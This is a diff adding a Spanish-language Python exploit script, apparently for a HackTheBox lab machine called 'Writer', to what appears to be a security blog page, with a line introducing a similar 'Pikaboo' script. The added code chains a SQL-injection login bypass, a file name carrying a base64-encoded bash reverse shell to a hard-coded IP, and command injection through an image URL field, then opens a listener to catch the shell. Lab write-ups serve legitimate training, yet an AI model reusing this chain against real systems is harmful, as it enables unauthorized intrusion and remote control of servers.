@@ -4,6 +4,99 @@ layout: content
 
 <p> </p>
 
+<h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px;">Writer - HackTheBox</h2>
+
+```bash
+#!/usr/bin/python3
+
+import signal
+from pwn import *
+import requests
+import urllib3
+import base64
+import os
+
+
+def def_handler(sig, frame):
+    print("Saliendo...")
+    sys.exit(1)
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+
+login_url = "http://writer.htb/administrative"
+add_post = "http://writer.htb/dashboard/stories/add"
+bypass_sqli = "username: ' or 1 -- //"
+#burp = {'http': 'http://127.0.0.1:8080'}
+lport = 443
+
+def makeRequest():
+
+    # Cambiar IP por la vuestra
+    payload_malicious = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.75/443 0>&1'"
+    payload_malicious_bytes = payload_malicious.encode('ascii')
+    base64_bytes = base64.b64encode(payload_malicious_bytes)
+    base64_payload_malicious = base64_bytes.decode('ascii')
+
+    os.system(f"""touch "reverse_shell.jpg; \`echo {base64_payload_malicious} | base64 -d | bash\`;" """)
+
+    s = requests.session()
+    s.verify = False
+    urllib3.disable_warnings()
+
+    p1 = log.progress("Login")
+
+    data_post = {
+        'uname': bypass_sqli,
+        'password': bypass_sqli
+    }
+
+    r = s.post(login_url, data=data_post, allow_redirects=True)
+
+    p1.status("Success [✔]")
+    p2 = log.progress("Malicious image")
+
+    image = open(f"reverse_shell.jpg; `echo {base64_payload_malicious} | base64 -d | bash`;", "rb")
+
+    file_image = {
+        "author": (None, ''),
+        "title": (None, ''),
+        "tagline": (None, ''),
+        "image": image,
+        "image_url": (None, ''),
+        "content": (None, '')
+    }
+
+    r = s.post(add_post, files=file_image)
+
+    p2.status("Uploaded [✔]")
+
+    route_image = {
+        "author": (None, ''),
+        "title": (None, ''),
+        "tagline": (None, ''),
+        "image": ('', ''),
+        "image_url": (None, f'file:///var/www/writer.htb/writer/static/img/reverse_shell.jpg; `echo {base64_payload_malicious} | base64 -d | bash`;'),
+        "content": (None, '')
+    }
+
+    p2.success("Injected payload [✔]")
+
+    r = s.post(add_post, files=route_image)
+
+if __name__ == '__main__':
+
+    try:
+        threading.Thread(target=makeRequest, args=()).start()
+    except Exception as e:
+        log.error(str(e))
+
+shell = listen(lport, timeout=20).wait_for_connection()
+shell.interactive()
+
+
+```
+
 <h2 style="color: rgba(255, 255, 255, 0.7); font-family: 'Yanone Kaffeesatz'; letter-spacing: 2px;">Pikaboo - HackTheBox</h2>
 
 Este *Script* se aprovecha de un `Local File Inclusion` para derivarlo al envenenado de logs de `FTP` y por ello ganar un Shell inverso inyectando código malicioso en los campos `user` y `password` en la autenticación.
